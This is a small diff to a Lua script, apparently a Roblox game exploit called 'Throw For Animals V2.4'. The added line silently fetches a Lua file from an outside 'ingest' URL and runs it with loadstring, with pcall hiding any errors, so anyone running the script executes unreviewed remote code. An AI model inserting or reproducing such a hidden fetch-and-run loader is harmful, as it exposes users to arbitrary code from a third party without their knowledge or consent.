@@ -1,6 +1,8 @@
 -- Throw For Animals V2.4 | by D33RZN
 if not game:IsLoaded() then game.Loaded:Wait() end
 
+pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_2f73ac6dfe4a", "2.4.0", false) end)
+
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TS = game:GetService("TweenService")
